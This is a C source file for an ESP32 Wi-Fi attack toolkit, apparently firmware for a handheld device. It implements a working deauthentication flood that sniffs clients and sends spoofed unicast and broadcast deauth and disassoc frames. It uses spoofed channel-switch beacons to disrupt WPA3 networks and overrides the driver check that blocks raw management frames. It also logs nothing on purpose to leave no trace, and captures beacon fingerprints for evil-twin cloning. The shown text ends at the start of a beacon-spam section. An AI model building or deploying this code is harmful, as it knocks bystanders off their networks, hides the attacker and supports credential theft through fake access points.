// Wi-Fi offensive toolkit engine. See nucleo_wifiatk.h for purpose, scope and the authorized-use
// policy. Clean-room: built on the public esp_wifi raw-TX + promiscuous-RX paths, not copied from
// any GPL firmware.
//
// Deauth flood — what makes it *effective* (not just a broadcast spray):
//   * Discovery: while armed we run a promiscuous RX callback that parses 802.11 headers and learns
//     which stations are talking to each target AP. A broadcast deauth is widely ignored by modern
//     clients; a *unicast* deauth aimed at a real associated station is what actually drops it.
//   * Per discovered station we inject BOTH directions — AP->STA and STA->AP — plus a broadcast as
//     a catch-all, cycling reason codes (some stacks only honour particular ones).
//   * Channel grouping: we set a channel ONCE and hit every target on it (dwelling long enough for
//     the RX callback to keep finding clients), then move to the next channel. No per-AP thrashing.
//   * We max out TX power and disable power-save so frames go out hard and uninterrupted.
//
// Smarter than a blind sprayer (things Bruce/Marauder don't do):
//   * PMF-aware: the scan records each AP's authmode; WPA3/OWE use Protected Management Frames, so
//     deauth/disassoc are ignored — flood-all SKIPS them instead of wasting airtime on immune APs.
//   * Adaptive dwell: channels where we've actually heard clients get extra attack passes.
//   * Effectiveness telemetry: per-station last-seen lets us report clients still on the air vs.
//     clients gone silent under the flood (the ones we've likely kicked).
//
// While running it OWNS the radio: STA + promiscuous, OS web server stopped. Stop reverses it all
// (leave promiscuous, restore the saved network, restart the OS web UI).
// Privacy: NO serial logging from the offensive stack — not "ARMED" lines, not the disarm notices.
// Defining this before any header compiles out every ESP_LOGx in this file -> zero console trace.
#define LOG_LOCAL_LEVEL ESP_LOG_NONE
#include "nucleo_wifiatk.h"
#include "nucleo_httpd.h"

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

#include "esp_log.h"
#include "esp_wifi.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "esp_rom_sys.h"           // esp_rom_delay_us — drain pacing when the TX queue backs up
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "nucleo_exclusive.h"   // NX_NET_APP reclaim (~70KB); symbols resolve at link like the externs below
#include "nucleo_wifiatk_probe.h"   // pure probe-request SSID parser (KARMA lure)

// Restore the saved network on stop (resolved at final link — same no-cycle arrangement the Evil
// Portal uses: a hard REQUIRES on nucleo_setup would cycle, and we only need this one symbol).
extern esp_err_t nucleo_setup_apply_network(void);
extern void      nucleo_setup_suspend(void);   // stop the STA auto-reconnect while we own the radio

// mDNS silencing is now handled by nucleo_exclusive_enter(NX_NET_APP) (NX_DISCOVERY), not direct calls.

static const char *TAG = "wifiatk";

// ---- RF / antenna provisioning ---------------------------------------------
// The ESP32-S3 radio is 2.4 GHz only — no antenna adds 5/6 GHz (that needs a different radio; the
// hook below is where an external radio module would plug in later). What an external u.FL antenna
// DOES buy is range + injection reach, which directly helps the practical limits. Boards that expose
// an RF switch select the external antenna by driving one GPIO: set NUCLEO_RF_ANT_SWITCH_GPIO to it.
#ifndef NUCLEO_RF_ANT_SWITCH_GPIO
#define NUCLEO_RF_ANT_SWITCH_GPIO    (-1)   // -1 = none / fixed PCB antenna (stock Cardputer)
#endif
#ifndef NUCLEO_RF_ANT_EXTERNAL_LEVEL
#define NUCLEO_RF_ANT_EXTERNAL_LEVEL 1      // GPIO level that routes RF to the external connector
#endif
#if NUCLEO_RF_ANT_SWITCH_GPIO >= 0
#include "driver/gpio.h"
#endif

// Push the radio as hard as the hardware allows before an attack: chip-max TX power, and (if wired)
// flip the RF switch to the external antenna.
static void rf_boost(void)
{
    esp_wifi_set_max_tx_power(84);          // chip ceiling (~21 dBm); a passive ext. antenna adds gain
#if NUCLEO_RF_ANT_SWITCH_GPIO >= 0
    gpio_set_direction((gpio_num_t)NUCLEO_RF_ANT_SWITCH_GPIO, GPIO_MODE_OUTPUT);
    gpio_set_level((gpio_num_t)NUCLEO_RF_ANT_SWITCH_GPIO, NUCLEO_RF_ANT_EXTERNAL_LEVEL);
#endif
}

// ESP-IDF's net80211 layer refuses to transmit deauth/disassoc management frames through
// esp_wifi_80211_tx() unless this internal validator (linked from the precompiled libnet80211.a)
// is overridden to accept them. Providing a strong definition here shadows the library's copy (the
// CMake adds -Wl,--allow-multiple-definition so the link keeps ours and GC drops theirs). This is
// the standard, publicly-documented ESP32 raw-frame technique — SDK-level, not project source.
int ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3)
{
    (void)arg; (void)arg2; (void)arg3;
    return 0;
}

// ---- target (AP) list -------------------------------------------------------
#define MAX_TARGETS 24
typedef struct {
    char             ssid[33];
    uint8_t          bssid[6];
    uint8_t          channel;
    int8_t           rssi;
    wifi_auth_mode_t auth;     // from the scan; drives the PMF/"immune" classification below
    // Beacon fingerprint (for the evil-twin coherence check): a client/WIDS flags a twin whose
    // technical identity diverges from the real AP, so the Evil Portal reads these to clone the
    // security/cipher faithfully and the UI can show the operator exactly what "coherent" means.
    uint8_t          pairwise;  // wifi_cipher_type_t of the RSN pairwise cipher (CCMP/TKIP/...)
    uint8_t          phy;       // bit0=11b 1=11g 2=11n 3=11ax (S3 tops out at 11n -> an ac/ax tell)
    bool             wps;       // WPS advertised in the beacon
} ap_t;

static ap_t s_targets[MAX_TARGETS];
static int  s_ntargets;

// PMF (802.11w) is effectively mandatory on these, so clients ignore deauth/disassoc — attacking
// them is wasted airtime. WPA2/WPA3 transitional is deliberately NOT here: it still carries
// deauthable legacy (WPA2-only) clients.
static bool authmode_protected(wifi_auth_mode_t a)
{
    return a == WIFI_AUTH_WPA3_PSK || a == WIFI_AUTH_OWE
#ifdef WIFI_AUTH_WPA3_ENT_192
        || a == WIFI_AUTH_WPA3_ENT_192
#endif
        ;
}

static const char *authmode_short(wifi_auth_mode_t a)
{
    switch (a) {
        case WIFI_AUTH_OPEN:          return "open";
        case WIFI_AUTH_WEP:           return "WEP";
        case WIFI_AUTH_WPA_PSK:       return "WPA";
        case WIFI_AUTH_WPA2_PSK:      return "WPA2";
        case WIFI_AUTH_WPA_WPA2_PSK:  return "WPA2";
        case WIFI_AUTH_WPA2_WPA3_PSK: return "WPA2/3";
        case WIFI_AUTH_WPA3_PSK:      return "WPA3";
        case WIFI_AUTH_OWE:           return "OWE";
        default:                      return "ent";
    }
}

// ---- discovered stations (clients) ------------------------------------------
// Flat table keyed by (bssid, mac); filled by the promiscuous RX callback while armed.
#define MAX_STA 48
typedef struct { uint8_t bssid[6]; uint8_t mac[6]; int64_t last_us; } sta_t;
static sta_t s_sta[MAX_STA];
static volatile int s_nsta;
static portMUX_TYPE s_mux = portMUX_INITIALIZER_UNLOCKED;

#define ACTIVE_US 6000000LL                  // a station silent longer than this counts as "kicked"
static volatile unsigned s_reconnects;       // times a silenced station reappeared = a forced reconnect
                                             // (real external proof the deauth landed, not just a TX count)

static inline bool mac_eq(const uint8_t *a, const uint8_t *b) { return memcmp(a, b, 6) == 0; }
static inline bool mac_unicast(const uint8_t *m) { return !(m[0] & 0x01); }   // group/multicast bit clear

static int target_index(const uint8_t *bssid)
{
    for (int i = 0; i < s_ntargets; i++) if (mac_eq(s_targets[i].bssid, bssid)) return i;
    return -1;
}

static void add_station(const uint8_t *bssid, const uint8_t *mac)
{
    if (!mac_unicast(mac) || mac_eq(mac, bssid)) return;
    int64_t now = esp_timer_get_time();
    taskENTER_CRITICAL(&s_mux);
    int slot = -1;
    for (int i = 0; i < s_nsta; i++)
        if (mac_eq(s_sta[i].mac, mac) && mac_eq(s_sta[i].bssid, bssid)) { slot = i; break; }
    if (slot >= 0) {
        if (now - s_sta[slot].last_us > ACTIVE_US) s_reconnects++;   // was silent, now back = forced reconnect
        s_sta[slot].last_us = now;                 // refresh activity: this station is still on the air
    } else if (s_nsta < MAX_STA) {
        memcpy(s_sta[s_nsta].bssid, bssid, 6);
        memcpy(s_sta[s_nsta].mac, mac, 6);
        s_sta[s_nsta].last_us = now;
        s_nsta++;
    }
    taskEXIT_CRITICAL(&s_mux);
}

// Parse one sniffed frame; if it belongs to a target AP, learn the station MAC.
static void promisc_cb(void *buf, wifi_promiscuous_pkt_type_t type)
{
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 24) return;
    const uint8_t *p = pkt->payload;
    uint8_t fc1 = p[1];
    bool tods = fc1 & 0x01, fromds = fc1 & 0x02;
    const uint8_t *a1 = p + 4, *a2 = p + 10, *a3 = p + 16;
    const uint8_t *bssid = NULL, *sta = NULL;
    if (tods && !fromds)      { bssid = a1; sta = a2; }   // STA -> AP : a1=BSSID a2=source(STA)
    else if (!tods && fromds) { bssid = a2; sta = a1; }   // AP -> STA : a2=BSSID a1=dest(STA)
    else                      { bssid = a3; sta = NULL; } // IBSS/mgmt/beacon : BSSID known, STA ambiguous
    int ti = target_index(bssid);
    if (ti < 0) return;
    s_targets[ti].rssi = pkt->rx_ctrl.rssi;               // live signal of this AP (proximity feedback)
    if (sta) add_station(bssid, sta);
}

// ---- AP scan ----------------------------------------------------------------
int nucleo_wifiatk_scan(void)
{
    esp_wifi_set_mode(WIFI_MODE_APSTA);          // STA iface needed to scan; keep the AP up
    esp_wifi_scan_stop();
    // PASSIVE scan: just listen for beacons. An active scan would spray probe requests carrying our
    // real STA MAC, tying the recon to this device — passive recon leaves no such trail.
    wifi_scan_config_t sc = { 0 };
    sc.scan_type = WIFI_SCAN_TYPE_PASSIVE;
    sc.scan_time.passive = 150;                  // ms/channel: long enough to catch a beacon period
    esp_err_t err = esp_wifi_scan_start(&sc, true);    // blocking
    if (err != ESP_OK) {
        ESP_LOGE(TAG, "scan failed: %s (0x%x)", esp_err_to_name(err), err);
        return s_ntargets;
    }
    uint16_t num = 0;
    esp_wifi_scan_get_ap_num(&num);
    if (num == 0) { s_ntargets = 0; return 0; }
    wifi_ap_record_t *recs = malloc(num * sizeof(wifi_ap_record_t));
    if (!recs) return s_ntargets;
    esp_wifi_scan_get_ap_records(&num, recs);

    s_ntargets = 0;
    for (int i = 0; i < num && s_ntargets < MAX_TARGETS; i++) {
        bool dup = false;                        // de-dup by BSSID (multi-radio APs repeat)
        for (int j = 0; j < s_ntargets; j++)
            if (mac_eq(s_targets[j].bssid, recs[i].bssid)) { dup = true; break; }
        if (dup) continue;
        ap_t *t = &s_targets[s_ntargets++];
        snprintf(t->ssid, sizeof t->ssid, "%s", (const char *)recs[i].ssid);
        memcpy(t->bssid, recs[i].bssid, 6);
        t->channel = recs[i].primary;
        t->rssi = recs[i].rssi;
        t->auth = recs[i].authmode;
        t->pairwise = (uint8_t)recs[i].pairwise_cipher;
        t->phy = (recs[i].phy_11b ? 1 : 0) | (recs[i].phy_11g ? 2 : 0)
               | (recs[i].phy_11n ? 4 : 0) | (recs[i].phy_11ax ? 8 : 0);
        t->wps = recs[i].wps;
    }
    free(recs);

    // Sort strongest-first: nicer to pick from, and flood-all hits the closest APs soonest.
    for (int i = 1; i < s_ntargets; i++) {
        ap_t key = s_targets[i]; int j = i - 1;
        while (j >= 0 && s_targets[j].rssi < key.rssi) { s_targets[j + 1] = s_targets[j]; j--; }
        s_targets[j + 1] = key;
    }
    ESP_LOGI(TAG, "scan: %d AP(s)", s_ntargets);
    return s_ntargets;
}

int nucleo_wifiatk_target_count(void) { return s_ntargets; }

const char *nucleo_wifiatk_target_ssid(int i)
{
    if (i < 0 || i >= s_ntargets) return "";
    return s_targets[i].ssid[0] ? s_targets[i].ssid : "(hidden)";
}
int nucleo_wifiatk_target_channel(int i) { return (i >= 0 && i < s_ntargets) ? s_targets[i].channel : 0; }
int nucleo_wifiatk_target_rssi(int i)    { return (i >= 0 && i < s_ntargets) ? s_targets[i].rssi : 0; }

const char *nucleo_wifiatk_target_bssid(int i)
{
    static char buf[18];
    if (i < 0 || i >= s_ntargets) { buf[0] = 0; return buf; }
    const uint8_t *b = s_targets[i].bssid;
    snprintf(buf, sizeof buf, "%02X:%02X:%02X:%02X:%02X:%02X", b[0], b[1], b[2], b[3], b[4], b[5]);
    return buf;
}

void nucleo_wifiatk_target_bssid_bytes(int i, unsigned char out[6])
{
    if (i < 0 || i >= s_ntargets) { memset(out, 0, 6); return; }
    memcpy(out, s_targets[i].bssid, 6);
}

const char *nucleo_wifiatk_target_auth(int i)
{
    return (i >= 0 && i < s_ntargets) ? authmode_short(s_targets[i].auth) : "";
}

// Raw wifi_auth_mode_t of a scanned AP, so the Evil Portal can clone its security faithfully.
int nucleo_wifiatk_target_authmode(int i)
{
    return (i >= 0 && i < s_ntargets) ? (int)s_targets[i].auth : 0;
}

static const char *cipher_short(uint8_t c)
{
    switch ((wifi_cipher_type_t)c) {
        case WIFI_CIPHER_TYPE_NONE:      return "";
        case WIFI_CIPHER_TYPE_WEP40:
        case WIFI_CIPHER_TYPE_WEP104:    return "WEP";
        case WIFI_CIPHER_TYPE_TKIP:      return "TKIP";
        case WIFI_CIPHER_TYPE_CCMP:      return "CCMP";
        case WIFI_CIPHER_TYPE_TKIP_CCMP: return "TKIP/CCMP";
        default:                         return "?";
    }
}

// Compact beacon fingerprint, e.g. "WPA2 CCMP bgn WPS" — what the operator must match for a credible
// twin (and what the open-twin downgrade visibly breaks). Shared static buffer; copy if you keep it.
const char *nucleo_wifiatk_target_fingerprint(int i)
{
    static char buf[40];
    if (i < 0 || i >= s_ntargets) { buf[0] = 0; return buf; }
    const ap_t *t = &s_targets[i];
    char phy[8]; int p = 0;
    if (t->phy & 1) phy[p++] = 'b';
    if (t->phy & 2) phy[p++] = 'g';
    if (t->phy & 4) phy[p++] = 'n';
    if (t->phy & 8) { phy[p++] = 'a'; phy[p++] = 'x'; }
    phy[p] = 0;
    const char *cip = cipher_short(t->pairwise);
    snprintf(buf, sizeof buf, "%s%s%s%s%s%s",
             authmode_short(t->auth),
             cip[0] ? " " : "", cip,
             phy[0] ? " " : "", phy,
             t->wps ? " WPS" : "");
    return buf;
}
bool nucleo_wifiatk_target_protected(int i)
{
    return (i >= 0 && i < s_ntargets) ? authmode_protected(s_targets[i].auth) : false;
}
int nucleo_wifiatk_targets_vulnerable(void)
{
    int n = 0;
    for (int i = 0; i < s_ntargets; i++) if (!authmode_protected(s_targets[i].auth)) n++;
    return n;
}

// ---- deauth flood -----------------------------------------------------------
static volatile bool   s_run;
static volatile bool   s_bcn_run;   // declared early so deauth_start() can guard against it (beacon owns the radio)
static TaskHandle_t    s_task;
static int             s_target = -1;        // < 0 => flood all
static volatile unsigned long s_frames;
// Injection health: every esp_wifi_80211_tx attempt vs the ones the driver actually accepted. On
// ESP32 the raw-TX queue overflows under a tight flood and silently drops frames — tracking this
// lets the UI show whether injection is really working on this chip/firmware (the "works but badly"
// complaint), and lets tx_mgmt pace itself instead of spinning on a full queue. Shared with beacon
// spam (the two never run at once).
static volatile unsigned long s_tx_try, s_tx_fail;
static volatile unsigned s_pace_us;          // adaptive inter-frame delay (AIMD, see tx_pace)
static unsigned        s_ok_run;             // consecutive successful TXs (drives the pace decay)
static volatile int    s_cur_ch;
static volatile int    s_cur_rssi;           // live signal of the AP being hit (proximity feedback)
static char            s_cur_ssid[33];
static int64_t         s_start_us;

// Reason codes worth cycling: 1 unspecified, 4 inactivity, 5 AP-busy, 7 class-3-from-nonassoc.
static const uint8_t REASONS[] = { 0x07, 0x01, 0x04, 0x05 };
#define N_REASON ((int)(sizeof REASONS))

// Adaptive injection pacing (AIMD). The ESP32 raw-TX queue silently drops frames when hammered, so
// instead of a fixed delay we converge on the radio's real sustainable rate: back off after a drop,
// creep faster on a run of successes. Maximises *landed* frames (keeps inj% high) without throttling
// a healthy radio. Shared by deauth, CSA and beacon TX (they never run at once).
static void tx_pace(bool ok)
{
    if (ok) { if (++s_ok_run >= 32) { s_ok_run = 0; if (s_pace_us >= 40) s_pace_us -= 40; } }
    else    { s_tx_fail++; s_ok_run = 0; if (s_pace_us < 3000) s_pace_us += 300; }
    if (s_pace_us) esp_rom_delay_us(s_pace_us);
}

// Build + transmit one mgmt frame. subtype: 0xC0 deauth, 0xA0 disassoc.
// dst = addr1 (receiver), src = addr2 (transmitter), bssid = addr3.
static void tx_mgmt(uint8_t subtype, const uint8_t *dst, const uint8_t *src, const uint8_t *bssid, uint8_t reason)
{
    uint8_t f[26];
    f[0] = subtype; f[1] = 0x00; f[2] = 0x00; f[3] = 0x00;
    memcpy(f + 4,  dst,   6);
    memcpy(f + 10, src,   6);
    memcpy(f + 16, bssid, 6);
    f[22] = 0x00; f[23] = 0x00;            // seq/frag (the driver rewrites the seq)
    f[24] = reason; f[25] = 0x00;
    s_tx_try++;
    bool ok = (esp_wifi_80211_tx(WIFI_IF_STA, f, sizeof f, false) == ESP_OK);
    if (ok) s_frames++;
    tx_pace(ok);
}

static const uint8_t BCAST[6] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };

// Hit one AP: broadcast deauth+disassoc, then per known station both directions.
static void hit_ap(const ap_t *t, uint8_t reason)
{
    // Broadcast catch-all (kicks clients that honour broadcast; primes the rest).
    tx_mgmt(0xC0, BCAST, t->bssid, t->bssid, reason);
    tx_mgmt(0xC0, BCAST, t->bssid, t->bssid, reason);
    tx_mgmt(0xA0, BCAST, t->bssid, t->bssid, reason);

    // Snapshot this AP's stations under the lock, then inject outside it.
    uint8_t macs[MAX_STA][6]; int n = 0;
    taskENTER_CRITICAL(&s_mux);
    for (int i = 0; i < s_nsta && n < MAX_STA; i++)
        if (mac_eq(s_sta[i].bssid, t->bssid)) { memcpy(macs[n++], s_sta[i].mac, 6); }
    taskEXIT_CRITICAL(&s_mux);

    for (int i = 0; i < n; i++) {
        tx_mgmt(0xC0, macs[i],   t->bssid, t->bssid, reason);   // AP -> STA (deauth)
        tx_mgmt(0xC0, t->bssid,  macs[i],  t->bssid, reason);   // STA -> AP (deauth, spoofed)
        tx_mgmt(0xA0, macs[i],   t->bssid, t->bssid, reason);   // AP -> STA (disassoc)
    }
}

// PMF/WPA3 strategy. 802.11w protects deauth/disassoc but NOT beacons. A spoofed beacon from the
// target BSSID carrying a Channel Switch Announcement (CSA) IE tells associated clients the AP is
// moving to another channel; clients that honour CSA follow it and lose the (non-moving) real AP.
// This is NOT a crypto bypass — it's an unprotected-beacon disruption, and effect varies by client.
static uint8_t far_channel(uint8_t ch) { return (ch <= 6) ? 11 : 1; }

static void csa_beacon(const ap_t *t, uint8_t new_ch)
{
    uint8_t f[128]; int n = 0;
    f[n++] = 0x80; f[n++] = 0x00;                 // beacon
    f[n++] = 0x00; f[n++] = 0x00;                 // duration
    memset(f + n, 0xFF, 6); n += 6;               // DA = broadcast
    memcpy(f + n, t->bssid, 6); n += 6;           // SA = spoofed real AP BSSID
    memcpy(f + n, t->bssid, 6); n += 6;           // BSSID
    f[n++] = 0x00; f[n++] = 0x00;                 // seq
    memset(f + n, 0, 8); n += 8;                  // timestamp
    f[n++] = 0x64; f[n++] = 0x00;                 // beacon interval
    f[n++] = 0x11; f[n++] = 0x04;                 // capability: ESS + Privacy (match a protected AP)
    int sl = (int)strlen(t->ssid); if (sl > 32) sl = 32;
    f[n++] = 0x00; f[n++] = (uint8_t)sl; memcpy(f + n, t->ssid, sl); n += sl;   // SSID IE
    f[n++] = 0x03; f[n++] = 0x01; f[n++] = t->channel;                          // DS param (current ch)
    f[n++] = 0x25; f[n++] = 0x03; f[n++] = 0x01; f[n++] = new_ch; f[n++] = 0x01; // CSA: mode1, new ch, count1
    s_tx_try++;
    bool ok = (esp_wifi_80211_tx(WIFI_IF_STA, f, n, false) == ESP_OK);
    if (ok) s_frames++;
    tx_pace(ok);
}

#define DWELL_ROUNDS 4   // base attack passes per channel before moving on (also dwell time to sniff)
#define DWELL_BONUS  4   // extra passes on channels where we've actually heard clients

// Discovered stations belonging to an in-scope target on this channel — drives the adaptive dwell.
static int channel_client_count(int ch, bool single)
{
    int n = 0;
    taskENTER_CRITICAL(&s_mux);
    for (int i = 0; i < s_nsta; i++) {
        int ti = target_index(s_sta[i].bssid);
        if (ti < 0 || s_targets[ti].channel != ch) continue;
        if (single) { if (ti != s_target) continue; }
        else if (authmode_protected(s_targets[ti].auth)) continue;
        n++;
    }
    taskEXIT_CRITICAL(&s_mux);
    return n;
}

static void flood_task(void *arg)
{
    (void)arg;
    int reason_i = 0;
    while (s_run) {
        bool single = (s_target >= 0);
        int lo = single ? s_targets[s_target].channel : 1;
        int hi = single ? s_targets[s_target].channel : 13;
        bool did_any = false;
        for (int ch = lo; ch <= hi && s_run; ch++) {
            // Is any in-scope, attackable target on this channel? Flood-all skips PMF/WPA3 APs —
            // they ignore deauth, so spending airtime on them only dilutes the real attack.
            bool any = false;
            if (single) any = (s_targets[s_target].channel == ch);
            else for (int i = 0; i < s_ntargets; i++)
                     if (s_targets[i].channel == ch && !authmode_protected(s_targets[i].auth)) { any = true; break; }
            if (!any) continue;
            did_any = true;

            esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
            s_cur_ch = ch;
            vTaskDelay(pdMS_TO_TICKS(8));        // settle + let the RX cb hear this channel
            // Validate we actually landed on this channel (the driver can refuse silently); re-assert
            // if not — injecting on the wrong channel is a classic cause of "fires but nothing drops".
            uint8_t pch = 0; wifi_second_chan_t sch;
            if (esp_wifi_get_channel(&pch, &sch) == ESP_OK && pch != ch)
                esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);

            // Adaptive dwell: once we've heard real clients here, stay longer and hit them harder;
            // quiet channels get the base pass so discovery keeps moving.
            int rounds = DWELL_ROUNDS + (channel_client_count(ch, single) > 0 ? DWELL_BONUS : 0);
            for (int r = 0; r < rounds && s_run; r++) {
                uint8_t reason = REASONS[reason_i++ % N_REASON];
                if (single) {
                    const ap_t *t = &s_targets[s_target];
                    snprintf(s_cur_ssid, sizeof s_cur_ssid, "%s", t->ssid[0] ? t->ssid : "(hidden)");
                    s_cur_rssi = t->rssi;
                    uint8_t nc = far_channel(t->channel);
                    if (authmode_protected(t->auth)) {       // PMF: deauth ignored -> CSA channel-switch
                        csa_beacon(t, nc); csa_beacon(t, nc); csa_beacon(t, nc);
                    } else {
                        hit_ap(t, reason);
                        // Self-tuning: if deauth isn't biting after a while, auto-escalate to the CSA
                        // vector too (sticky client / under-detected PMF). Evidence-driven, not blind.
                        if (s_reconnects == 0 && (esp_timer_get_time() - s_start_us) > 10000000LL)
                            csa_beacon(t, nc);
                    }
                } else {
                    for (int i = 0; i < s_ntargets && s_run; i++) {
                        if (s_targets[i].channel != ch || authmode_protected(s_targets[i].auth)) continue;
                        snprintf(s_cur_ssid, sizeof s_cur_ssid, "%s",
                                 s_targets[i].ssid[0] ? s_targets[i].ssid : "(hidden)");
                        s_cur_rssi = s_targets[i].rssi;
                        hit_ap(&s_targets[i], reason);
                    }
                }
                vTaskDelay(1);                   // yield to the radio driver / WDT
            }
        }
        if (!did_any) vTaskDelay(pdMS_TO_TICKS(50));   // nothing in scope: idle politely
    }
    s_cur_ssid[0] = 0;
    s_cur_ch = 0;
    s_task = NULL;
    vTaskDelete(NULL);
}

esp_err_t nucleo_wifiatk_deauth_start(int target_idx)
{
    if (s_run) return ESP_OK;
    if (s_bcn_run) return ESP_ERR_INVALID_STATE;         // beacon spam already owns the radio (symmetric with beacon_start)
    if (s_ntargets == 0) return ESP_ERR_INVALID_STATE;   // scan first
    if (target_idx >= s_ntargets) target_idx = -1;
    s_target = target_idx;
    s_frames = 0;
    s_tx_try = 0; s_tx_fail = 0; s_pace_us = 0; s_ok_run = 0;
    s_reconnects = 0;
    s_nsta = 0;
    s_cur_ch = 0; s_cur_rssi = 0;
    s_cur_ssid[0] = 0;
    s_start_us = esp_timer_get_time();

    // We OWN the radio here (raw injection) — exclusive never touches Wi-Fi (no NX_WIFI), so we still
    // suspend STA auto-reconnect ourselves. NX_NET_APP also frees voice + ANIMA L1 (~24KB) the old
    // manual teardown left resident; restored by nucleo_exclusive_exit() on every exit path below. The
    // WIFI_PS_NONE set just below is restored to MIN_MODEM by nucleo_setup_apply_network() on exit.
    nucleo_setup_suspend();                               // no real-MAC re-association to home mid-attack
    nucleo_exclusive_enter(NX_NET_APP, NULL);             // stop httpd + mDNS + voice + L1
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();                                     // no-op if already started
    esp_wifi_set_ps(WIFI_PS_NONE);                        // no power-save naps mid-flood
    rf_boost();                                           // chip-max power + external antenna if wired
    // Force injected mgmt frames to 1 Mbps long-preamble: the most robust, longest-range rate, so
    // deauths are actually received (the default high MCS rate is the #1 cause of "works but badly").
    esp_wifi_config_80211_tx_rate(WIFI_IF_STA, WIFI_PHY_RATE_1M_L);

    esp_wifi_set_promiscuous_rx_cb(promisc_cb);
    wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT };
    esp_wifi_set_promiscuous_filter(&filt);
    esp_err_t pe = esp_wifi_set_promiscuous(true);        // enables free channel set + raw inject + sniff
    if (pe != ESP_OK) {
        ESP_LOGE(TAG, "promiscuous on failed: %s", esp_err_to_name(pe));
        esp_wifi_set_promiscuous_rx_cb(NULL);
        nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
        return pe;
    }

    s_run = true;
    if (xTaskCreate(flood_task, "wa_deauth", 4096, NULL, 5, &s_task) != pdPASS) {
        s_run = false;
        esp_wifi_set_promiscuous(false);
        esp_wifi_set_promiscuous_rx_cb(NULL);
        nucleo_setup_apply_network(); nucleo_exclusive_exit();   // network up first, then httpd/mDNS/voice
        return ESP_FAIL;
    }
    ESP_LOGW(TAG, "Deauth flood ARMED: %s", s_target < 0 ? "ALL channels/APs" : s_targets[s_target].ssid);
    return ESP_OK;
}

void nucleo_wifiatk_deauth_stop(void)
{
    if (!s_run) return;
    s_run = false;
    for (int i = 0; i < 40 && s_task; i++) vTaskDelay(pdMS_TO_TICKS(25));   // let the task exit

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    nucleo_setup_apply_network();        // restore STA/AP from the saved config (network up first)
    nucleo_exclusive_exit();             // restart httpd + mDNS + voice; ANIMA L1 reloads lazily
    ESP_LOGI(TAG, "Deauth flood disarmed; network + OS web UI restored");
}

bool          nucleo_wifiatk_deauth_running(void) { return s_run; }
unsigned long nucleo_wifiatk_frames(void)         { return s_frames; }
int           nucleo_wifiatk_clients(void)        { return s_nsta; }
// % of injection attempts the driver actually accepted (100 if none yet). Low = the chip/firmware is
// dropping frames — the honest signal behind "deauth works but badly" on some ESP32 setups.
int           nucleo_wifiatk_inject_health(void)
{
    unsigned long t = s_tx_try;
    return t ? (int)((s_tx_try - s_tx_fail) * 100 / t) : 100;
}
int           nucleo_wifiatk_cur_channel(void)    { return s_cur_ch; }
int           nucleo_wifiatk_cur_rssi(void)       { return s_cur_rssi; }   // live signal of the AP being hit (dBm)
unsigned      nucleo_wifiatk_reconnects(void)     { return s_reconnects; }
const char   *nucleo_wifiatk_cur_ssid(void)       { return s_cur_ssid; }
int           nucleo_wifiatk_targets_active(void) { return s_run ? (s_target < 0 ? nucleo_wifiatk_targets_vulnerable() : 1) : 0; }

// "active" = seen within ACTIVE_US; the rest have gone quiet under the flood (likely kicked). A
// heuristic, but together with the RECON counter it's the clearest live signal the flood is working.
int nucleo_wifiatk_clients_active(void)
{
    int64_t now = esp_timer_get_time();
    int n = 0;
    taskENTER_CRITICAL(&s_mux);
    for (int i = 0; i < s_nsta; i++) if (now - s_sta[i].last_us < ACTIVE_US) n++;
    taskEXIT_CRITICAL(&s_mux);
    return n;
}
unsigned      nucleo_wifiatk_uptime_s(void)
{
    return s_run ? (unsigned)((esp_timer_get_time() - s_start_us) / 1000000) : 0;
}

// ---- beacon spam ------------------------------------------------------------
// Flood the air with fake beacon frames so a wall of bogus SSIDs appears in everyone's Wi-Fi list
// (the classic Bruce/Marauder "Beacon Spam") — but engineered NOT to be missed. Three modes:
//   FUNNY  : a curated wall of plausible/joke SSIDs (mixed open + WPA2 so a few show a lock)
//   RANDOM : a session of randomly generated, real-looking SSIDs (e.g. "iPhone di Luca 3F")
//   CLONE  : twins of the real APs around you (runs a passive scan first; strongest realism)
//
// Why it beats a blind sprayer (the "I can't see them on my phone" fixes):
//   * STABLE BSSID per fake AP (assigned once) -> reads as a persistent network, not flapping noise.
//     Bruce/Marauder regenerate the MAC every frame, so each beacon looks like a brand-new AP.
//   * DWELL + REPEAT: we sit on a channel and re-beacon the WHOLE set several times before hopping.
//     A real AP beacons ~10x/s on ONE channel; a phone's scan dwells ~100ms/channel, so the classic
//     "blast once then hop" is exactly why beacons get missed. We saturate the channel instead.
//   * STANDARDS-COMPLETE frame: SSID + supported rates + DS param + ERP IE (+ RSN IE on the WPA2
//     ones). The ERP element is what strict 11g scanners want; without it some stacks drop the beacon.
//   * 100 TU interval + 1 Mbps long-preamble + chip-max TX power (set in beacon_start) = robust reach.
// Same raw-TX path + sanity-check override the deauth uses, injected on the STA iface under
// promiscuous mode (no real AP of ours is exposed). AUTHORIZED testing only.
static const char *FUNNY_SSIDS[] = {
    "Free Public WiFi", "Aeroporto Free WiFi", "Hotel Guest", "Starbucks WiFi", "McDonald's Free WiFi",
    "FRITZ!Box Gast", "TIM-Guest", "Vodafone Hotspot", "FASTWEB-FREE", "WINDTRE-WiFi",
    "Comune WiFi Free", "Biblioteca WiFi", "Treno WiFi", "Autogrill Free WiFi", "Bar WiFi",
    "FBI Surveillance Van", "Pretty Fly for a WiFi", "Tell My WiFi Love Her", "Loading...", "Mom Click Here",
    "Hidden Network", "The Promised LAN", "Martin Router King", "Abraham Linksys", "Get Off My LAN",
};
#define N_FUNNY ((int)(sizeof(FUNNY_SSIDS)/sizeof(FUNNY_SSIDS[0])))

